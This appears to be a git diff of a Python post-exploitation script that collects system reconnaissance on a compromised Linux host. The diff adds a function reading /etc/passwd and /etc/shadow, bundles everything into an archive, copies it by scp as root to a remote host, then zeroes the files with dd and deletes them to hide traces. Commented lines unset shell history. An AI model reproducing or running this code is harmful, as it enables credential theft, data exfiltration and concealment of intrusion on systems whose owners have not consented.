@@ -83,7 +83,7 @@ def preLim():
     everything.append(bashCmd("crontab -l"))
 
     for i in range(0,len(everything)):
-        w2File(everything[i],"preLiminary")
+        w2File(everything[i],"final")
 
     #result=bashCmd("unset HISTFILE",1)
     #result=bashCmd("unset HISTSIZE",1)
@@ -131,14 +131,14 @@ def nextStuff():
         every.append("ulimit -c: "+result)
     except: pass # print("no ulimit")
     
-    w2File(bashCmd("ls -laR /home"),"homeTree")
-    w2File(bashCmd("ls -laR / "),"fullTree")
+    every.append(bashCmd("ls -laR /home"))
+    every.append(bashCmd("ls -laR / "))
     every.append(bashCmd("find / -uid 0 -perm -4000"))
     every.append(bashCmd("find /var/log -type f -mmin 30"))
     every.append(bashCmd("grep -n \"192.168.1.145\" /var/log/*"))
 
     for i in range(0,len(every)):
-        w2File(every[i],"nextInfo")
+        w2File(every[i],"final")
 
 
 ##########################################
@@ -164,18 +164,24 @@ def w2File(result,filename,i=0):
         with open("/tmp/info/"+filename,'a') as f:
             print(result,file=f)
             sep="------------------------------------"
-            print(sep+sep+sep,file=f)
+            print(sep+sep,file=f)
         #for r in result:
         #    print(r[0],"\n",r[1],file=f)
+    elif(i==2):
+        with open("/tmp/info/"+filename,'a') as f:
+            print(result,file=f)
     else:
         with open("/tmp/info/"+filename,'w') as f:
             print(result,file=f)
 
-def xferFile():
+def xferFile(dfile,IPandLoc):
     # encode and gzip, then xfer
     # uuencode -m <file to encode>
     # ssh <IP> uuencode -m /bin/ls - | unudecode > ls
-    pass
+    os.chdir("/tmp/info")
+    zfile=bashCmd("tar -czvf "+dfile+".tar.gz "+dfile+" | uuencode -m")
+    #print(zfile)
+    bashCmd("scp /tmp/info/"+dfile+".tar.gz root@"+IPandLoc)
 
 ## this function lists all logs touched today, sends info files to IP/folder location
 ## zeros out files and removes all info files
@@ -205,14 +211,30 @@ def logClean(IPandLoc):
     # find all info files
     files=bashCmd("ls /tmp/info")
     files2=files.split()
+    print()
     # for each info file found, send to AP and zero out files
-    for i in range(0,len(files2)):
-        ###############################################scp here!!
-        bashCmd("scp /tmp/info/"+files2[i]+" root@"+IPandLoc)
-        size=bashCmd("ls -latr /tmp/info/"+files2[i]).split()    
-        bashCmd("dd if=/dev/zero of=/tmp/info/"+files2[i]+
-                " bs=1 count="+size[4])
+    xferFile("final",IPandLoc)
+    # original file
+    size=bashCmd("ls -latr /tmp/info/final").split()
+    bashCmd("dd if=/dev/zero of=/tmp/info/final bs=1 count="+size[4])
+    # tar file
+    size=0
+    size=bashCmd("ls -latr /tmp/info/final.tar.gz").split()
+    bashCmd("dd if=/dev/zero of=/tmp/info/final.tar.gz bs=1 count="+size[4])
     bashCmd("rm -rf /tmp/info/")
+
+def getPass():
+    passwd=[]
+    with open ("/etc/passwd","r") as p:
+        pas=p.readlines()
+        w2File("\n\n","final")
+        for i in pas:
+            w2File(i.split('\n')[0],"final",2)
+    with open ("/etc/shadow","r") as g:
+        s=g.readlines()
+        w2File("\n\n","final")
+        for i in s:
+            w2File(i.split('\n')[0],"final",2)
 
 ##########################################
 
@@ -220,6 +242,7 @@ if not os.path.exists('/tmp/info'):
     os.makedirs('/tmp/info')
 
 preLim()
-#nextStuff()
-#xferFile()
-logClean("192.168.85.131:/root/Desktop")
+nextStuff()
+getPass()
+#xferFile("preLiminary","192.168.10.30:/root/Desktop/info")
+logClean("192.168.10.30:/root/Desktop/info")
